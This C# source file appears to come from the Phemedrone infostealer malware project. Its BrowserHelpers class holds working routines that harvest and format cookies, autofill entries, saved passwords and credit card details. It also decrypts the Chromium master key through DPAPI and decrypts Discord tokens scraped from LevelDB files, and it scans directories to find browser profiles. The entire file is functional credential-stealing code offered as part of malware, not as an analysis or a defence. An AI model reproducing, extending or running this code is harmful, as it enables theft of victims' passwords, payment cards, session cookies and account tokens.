using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Phemedrone.Cryptography;

namespace Phemedrone.Extensions
{
    public static class BrowserHelpers
    {
        public static string FormatCookie(string hostname, string httpOnly, string path,
            string secure, long expires, string name, string value)
        {
            ServiceCounter.CookieCount++;
            return $"{hostname}\t{httpOnly}\t{path}\t{secure}\t{expires}\t{name}\t{value}";
        }

        public static string FormatAutofill(string name, string value)
        {
            ServiceCounter.AutoFillCount++;
            return $"Name: {name}\r\nValue: {value}";
        }

        public static string FormatPassword(string url, string username, string password, string browserName,
            string browserVersion, string profileName)
            => $"Hostname: {url}\r\nUsername: {username}\r\nPassword: {password}\r\nBrowser: {browserName} v{browserVersion} ({profileName})";


        public static string FormatCreditCard(string number, string placeholder, long month, long year,
            string browserName, string browserVersion, string profileName)
        {
            ServiceCounter.CreditCardCount++;
            return
                $"Number: {number}\r\nPlaceholder: {placeholder}\r\nExpiration: {month}/{year}\r\nBrowser: {browserName} v{browserVersion} ({profileName})";
        }

        public static List<string> ParseDiscordTokens(string levelDbPath, byte[] key)
        {
            return
                (from file in FileManager.EnumerateFiles(levelDbPath, "*.ldb", 1)
                let data = File.ReadAllText(file)
                from Match match in Regex.Matches(data, "dQw4w9WgXcQ:[^\"]*")
                let encrypted = match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]
                select AesGcm.DecryptValue(Convert.FromBase64String(encrypted), key)).ToList();
        }
        
        public static byte[] ParseMasterKey(string localStateFile)
        {
            var content = NullableValue.Call(() =>File.ReadAllText(localStateFile));
            if (content == null) return null;
            var jsonParser = new JsonParser();
            var key = jsonParser.ParseString("encrypted_key", content);
            if (key.Length < 1) return null;
            var decoded = Convert.FromBase64String(key);
            return Encoding.UTF8.GetString(decoded, 0, 5) != "DPAPI"
                ? null
                : DpApi.Decrypt(decoded.Skip(5).Take(decoded.Length - 5).ToArray());
        }

        public static List<string> ParseDatabase(string dbPath, string tableName,
            Func<Func<int, object>, string> lineHandler)
        {
            if (!File.Exists(dbPath)) return new List<string>();

            var reader = SQLiteReader.Create(dbPath);
            if (reader == null) return new List<string>();
            if (!reader.ReadTable(tableName)) return new List<string>();

            var content = new List<string>();
            for (var i = 0; i < reader.GetRowCount(); i++)
            {
                var row = i;
                var line = lineHandler(j => reader.GetValue(row, j));
                if (line == null) continue;
                content.Add(line);
            }

            return content;
        }

        public static List<string> ListBrowsers(string rootLocation, Func<string, bool> performCheck)
        {
            var browserLocations = new List<string>();
            var currentLocations = new List<string>
            {
                rootLocation
            };
            for (var depth = 0; depth < 2; depth++)
            {
                var newLocations = new List<string>();
                foreach (var directory in currentLocations.SelectMany(Directory.GetDirectories))
                {
                    try
                    {
                        if (performCheck(directory))
                        {
                            browserLocations.Add(directory);
                            continue;
                        }

                        if (Directory.GetFiles(directory).Length > 0) continue;
                        newLocations.Add(directory);
                    }
                    catch
                    {
                        // ignored bc it's basically unauthorized access exception
                    }
                }

                currentLocations = newLocations;
            }

            return browserLocations;
        }
    }
}